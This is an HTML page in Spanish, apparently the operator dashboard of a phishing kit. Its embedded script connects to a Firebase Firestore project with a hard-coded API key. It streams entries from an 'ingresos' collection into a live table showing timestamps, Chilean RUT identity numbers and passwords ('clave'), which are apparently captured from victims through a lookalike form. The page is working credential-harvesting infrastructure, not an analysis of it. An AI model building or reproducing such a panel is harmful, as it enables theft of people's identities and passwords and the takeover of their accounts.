
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Panel en Vivo - Ingresos</title>
  <script type="module">
    import {{ initializeApp }} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
    import {{ getFirestore, collection, onSnapshot, query, orderBy }} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

    const firebaseConfig = {{
      apiKey: "AIzaSyCdzFXQ2h6u2QA4O8TtUWf3TZxzTnP5O9E",
      authDomain: "formulario-ob.firebaseapp.com",
      projectId: "formulario-ob",
      storageBucket: "formulario-ob.appspot.com",
      messagingSenderId: "1017857662001",
      appId: "1:1017857662001:web:b80ad26965daf7ce960910"
    }};

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    const q = query(collection(db, "ingresos"), orderBy("timestamp", "desc"));
    const tabla = document.querySelector("#tabla tbody");

    onSnapshot(q, (snapshot) => {{
      tabla.innerHTML = "";  // Limpiar antes de volver a llenar
      snapshot.forEach((doc) => {{
        const data = doc.data();
        const row = document.createElement("tr");
        row.innerHTML = `
          <td>${{new Date(data.timestamp?.seconds * 1000).toLocaleString() || ""}}</td>
          <td>${{data.rut || ""}}</td>
          <td>${{data.clave || ""}}</td>
        `;
        tabla.appendChild(row);
      }});
    }});
  </script>
  <style>
    body {{
      font-family: sans-serif;
      padding: 20px;
      background: #f9f9f9;
    }}
    h2 {{
      color: #444;
    }}
    table {{
      border-collapse: collapse;
      width: 100%;
      background: white;
      box-shadow: 0 0 5px rgba(0,0,0,0.1);
    }}
    th, td {{
      border: 1px solid #ccc;
      padding: 8px 10px;
      text-align: left;
      font-size: 14px;
    }}
    th {{
      background-color: #d32f2f;
      color: white;
    }}
    tr:nth-child(even) {{
      background-color: #f2f2f2;
    }}
  </style>
</head>
<body>
  <h2>Panel de Ingresos - Firebase Firestore</h2>

  <table id="tabla">
    <thead>
      <tr>
        <th>Fecha y Hora</th>
        <th>RUT</th>
        <th>Contrase√±a</th>
      </tr>
    </thead>
    <tbody></tbody>
  </table>
</body>
</html>
